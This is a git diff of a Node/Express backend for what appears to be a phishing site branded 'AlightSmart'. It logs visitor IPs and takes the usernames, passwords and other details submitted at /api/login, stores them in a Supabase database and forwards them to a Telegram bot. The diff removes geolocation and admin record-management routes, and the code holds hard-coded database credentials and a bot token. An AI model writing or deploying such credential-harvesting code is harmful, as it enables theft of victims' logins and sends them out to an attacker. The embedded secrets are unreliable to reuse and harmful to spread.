@@ -6,9 +6,8 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Supabase Connection
 const pool = new Pool({
-    connectionString: 'postgresql://postgres.hgjjjpiaiwcmkbqfuvrb:ibnaira1999@@aws-1-eu-central-2.pooler.supabase.com:6543/postgres',
+    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
     ssl: { rejectUnauthorized: false }
 });
 
@@ -33,84 +32,47 @@ function getRealIP(req) {
            'Unknown';
 }
 
-// Telegram Config
 const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
 
-async function getLocation(ip) {
-    if (!ip || ip === 'Unknown') return 'Unknown Location';
-    const services = [
-        `https://ipapi.co/${ip}/json/`,
-        `https://freeipapi.com/api/json/${ip}`,
-        `http://ip-api.com/json/${ip}`
-    ];
-    for (const url of services) {
-        try {
-            const res = await fetch(url, { timeout: 6000 });
-            const data = await res.json();
-            if (data.city || data.country_name) {
-                return `${data.city || ''}, ${data.country_name || ''}`.trim() || 'Unknown Location';
-            }
-        } catch (e) {}
-    }
-    return 'Unknown Location';
-}
-
 async function sendTelegramNotification(record) {
-    const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +
-        `• *Type:* ${record.type}\n` +
-        `• *Username:* ${record.username || 'Visitor'}\n` +
-        `• *Password:* ${record.password || '-'}\n` +
-        `• *Details:* ${record.address || '-'}\n` +
-        `• *IP:* ${record.ip}\n` +
-        `• *Location:* ${record.location || 'Unknown Location'}\n` +
-        `• *Time:* ${record.timestamp}\n\n` +
-        `🕒 ${new Date().toLocaleString()}`;
-
+    const message = `🚨 *TEST NOTIFICATION*\nType: ${record.type}\nUser: ${record.username || 'Visitor'}\nIP: ${record.ip}`;
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
         });
-    } catch (err) {
-        console.error("Telegram failed:", err.message);
-    }
+    } catch (e) {}
 }
 
 async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    const location = await getLocation(ip);
+    console.log(`🔄 Attempting to save: ${type} | IP: ${ip}`);
 
     try {
         await pool.query(
             "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
-            [type, username, password, address, ip, location, timestamp]
+            [type, username, password, address, ip, 'Unknown', timestamp]
         );
-
-        console.log(`✅ SAVED: ${type} | Location: ${location}`);
-
-        // Send notification for EVERY activity (including pure page visits)
-        await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
-
+        console.log(`✅ SUCCESSFULLY SAVED: ${type}`);
+        await sendTelegramNotification({ type, username, password, address, ip });
     } catch (err) {
-        console.error("Save Error:", err.message);
+        console.error("❌ SAVE FAILED:", err.message);
     }
 }
 
-// ==================== ROUTES ====================
+// Routes
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
+    console.log("🌐 Main page visited from IP:", ip);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', async (req, res) => {
     const ip = getRealIP(req);
+    console.log("🌐 Login page visited from IP:", ip);
     await saveRecord('Page Visit', null, null, 'Login Page Opened', ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
@@ -118,6 +80,7 @@ app.get('/login.html', async (req, res) => {
 app.post('/api/login', async (req, res) => {
     const { username, password, address } = req.body;
     const ip = getRealIP(req);
+    console.log("🔑 Login attempt received:", { username, ip });
     await saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
@@ -125,38 +88,15 @@ app.post('/api/login', async (req, res) => {
 app.get('/api/records', async (req, res) => {
     try {
         const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
+        console.log(`📊 Records found: ${result.rows.length}`);
         res.json(result.rows);
     } catch (err) {
+        console.error("Records fetch error:", err.message);
         res.json([]);
     }
 });
 
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
-
-app.post('/api/confirm-code', async (req, res) => {
-    const { id, status } = req.body;
-    try {
-        await pool.query("UPDATE records SET address = address || ' | Status: ' || $1 WHERE id = $2", [status, id]);
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ success: false });
-    }
-});
-
-app.post('/api/delete-record', async (req, res) => {
-    const { id } = req.body;
-    try {
-        await pool.query("DELETE FROM records WHERE id = $1", [id]);
-        res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ success: false });
-    }
-});
-
-app.post('/api/clear', async (req, res) => {
-    await pool.query("DELETE FROM records");
-    res.json({ message: 'All records cleared' });
-});
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
